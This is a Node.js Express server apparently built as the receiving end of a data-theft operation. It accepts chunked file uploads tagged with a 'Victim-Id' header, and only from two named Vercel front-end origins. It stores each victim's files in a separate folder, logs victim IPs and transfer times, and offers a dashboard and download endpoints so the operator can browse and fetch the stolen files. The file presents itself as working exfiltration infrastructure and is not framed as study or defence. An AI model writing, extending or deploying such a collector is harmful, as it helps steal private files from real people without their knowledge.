const fs = require('fs');
require('dotenv').config();
const cors = require('cors');
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;

// Enable CORS
const corsOptions = {
    origin: ['https://deobfrontend-f30nw0x1c-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
    credentials: true,
};
app.use(cors(corsOptions));

// Request logging
app.use((req, res, next) => {
    console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
    next();
});

// Handle preflight request for upload
app.options('/upload', (req, res) => {
    res.header('Access-Control-Allow-Origin', corsOptions.origin);
    res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
    res.header('Access-Control-Allow-Headers', corsOptions.allowedHeaders.join(', '));
    res.header('Access-Control-Allow-Credentials', 'true');
    res.status(204).end();
});

// Serve dashboard files
app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));

app.get('/dashboard/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
});

// Handle raw binary upload
app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));

const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
if (!fs.existsSync(OUTPUT_BASE_DIR)) {
    fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
}

// Per-victim storage
const victimFolders = {};
const victimFileCounts = {};
const victimTotalFiles = {};
const connectedDevices = {};
const chunkTracker = new Map();

// Helper to check all files received (future email trigger)
function checkAndSendEmail(victimId, victimFolder) {
    const filesInFolder = fs.readdirSync(victimFolder);
    if (filesInFolder.length === victimTotalFiles[victimId]) {
        console.log(`✅ All files received for victim ${victimId}`);

        const timeTaken = Date.now() - connectedDevices[victimId].connectionTime;
        connectedDevices[victimId].totalUploadTime = (timeTaken / 1000).toFixed(2);

        console.log(`⏱️ Total upload time for ${victimId}: ${connectedDevices[victimId].totalUploadTime} seconds`);
    }
}

// Upload endpoint
app.post('/upload', (req, res) => {
    try {
        const filename = decodeURIComponent(req.headers['filename']);
        const victimId = decodeURIComponent(req.headers['victim-id']);
        const chunkIndex = parseInt(req.headers['chunk-index']);
        const totalChunks = parseInt(req.headers['total-chunks']);
        const ip = req.ip;

        if (!filename || !victimId || isNaN(chunkIndex) || isNaN(totalChunks)) {
            return res.status(400).json({ error: 'Missing or invalid headers' });
        }

        const chunkId = `${victimId}-${filename}-${chunkIndex}`;

        if (!chunkTracker.has(chunkId)) {
            chunkTracker.set(chunkId, new Set());
        }

        if (chunkTracker.get(chunkId).has(chunkIndex)) {
            console.log(`⏭️ Skipping duplicate chunk: ${chunkId}`);
            return res.status(200).json({ message: 'Duplicate chunk skipped' });
        }

        chunkTracker.get(chunkId).add(chunkIndex);

        if (!connectedDevices[victimId]) {
            connectedDevices[victimId] = {
                ip: ip,
                connectionTime: Date.now(),
                filesTransferred: 0,
                fileList: [],
                fileTimers: {},        // Start time per file
                fileEndTimes: {},      // End time per file
                fileDurations: {}      // Transfer time per file
            };
        }

        if (!victimFolders[victimId]) {
            const timestamp = new Date().toISOString().replace(/:/g, '-');
            victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
            fs.mkdirSync(victimFolders[victimId], { recursive: true });
            victimFileCounts[victimId] = 0;
            victimTotalFiles[victimId] = totalChunks;
        }

        const victimFolder = victimFolders[victimId];
        const filePath = path.join(victimFolder, filename);

        if (chunkIndex === 0 && !connectedDevices[victimId].fileTimers[filename]) {
            connectedDevices[victimId].fileTimers[filename] = Date.now();
        }

        fs.appendFile(filePath, req.body, (err) => {
            if (err) {
                console.error(`❌ Error writing file:`, err);
                return res.status(500).json({ error: 'Error saving file' });
            }

            victimFileCounts[victimId] += 1;
            connectedDevices[victimId].filesTransferred += 1;

            if (!connectedDevices[victimId].fileList.includes(filename)) {
                connectedDevices[victimId].fileList.push(filename);
            }

            if (victimFileCounts[victimId] === totalChunks) {
                const startTime = connectedDevices[victimId].fileTimers[filename];
                const endTime = Date.now();
                const duration = ((endTime - startTime) / 1000).toFixed(2);

                connectedDevices[victimId].fileEndTimes[filename] = new Date(endTime).toISOString();
                connectedDevices[victimId].fileDurations[filename] = duration;

                console.log(`✅ File ${filename} received completely in ${duration} seconds`);

                checkAndSendEmail(victimId, victimFolder);
            }

            res.status(200).json({ message: 'Chunk received successfully' });
        });
    } catch (error) {
        console.error(`❌ Upload error:`, error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Dashboard data endpoint
app.get('/dashboard-data', (req, res) => {
     const dashboardData = Object.entries(connectedDevices).map(([victimId, device]) => {
        const totalFilesReceived = device.fileList.length; // Count files received

        return {
            ...device,
            totalFiles: totalFilesReceived, // Add the total files field
        };
    });
    res.json(dashboardData); // Return the updated dashboard data
});

// File download endpoint
app.get('/download/:victimId/:filename', (req, res) => {
    try {
        const { victimId, filename } = req.params;

        // Ensure victim folder exists
        if (!victimFolders[victimId]) {
            console.log(`❌ Victim folder not found for victim ${victimId}`);
            return res.status(404).json({ error: 'Victim folder not found' });
        }

        const victimFolder = victimFolders[victimId];
        const filePath = path.join(victimFolder, filename);

        // Check if the file exists
        if (!fs.existsSync(filePath)) {
            console.log(`❌ File not found at ${filePath}`);
            return res.status(404).json({ error: 'File not found' });
        }

        // Log the file being downloaded
        console.log(`📥 Downloading file: ${filePath}`);

        res.download(filePath, filename, (err) => {
            if (err) {
                console.error(`❌ Download error:`, err);
                return res.status(500).json({ error: 'Error sending file' });
            }
        });
    } catch (error) {
        console.error(`❌ Download route error:`, error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
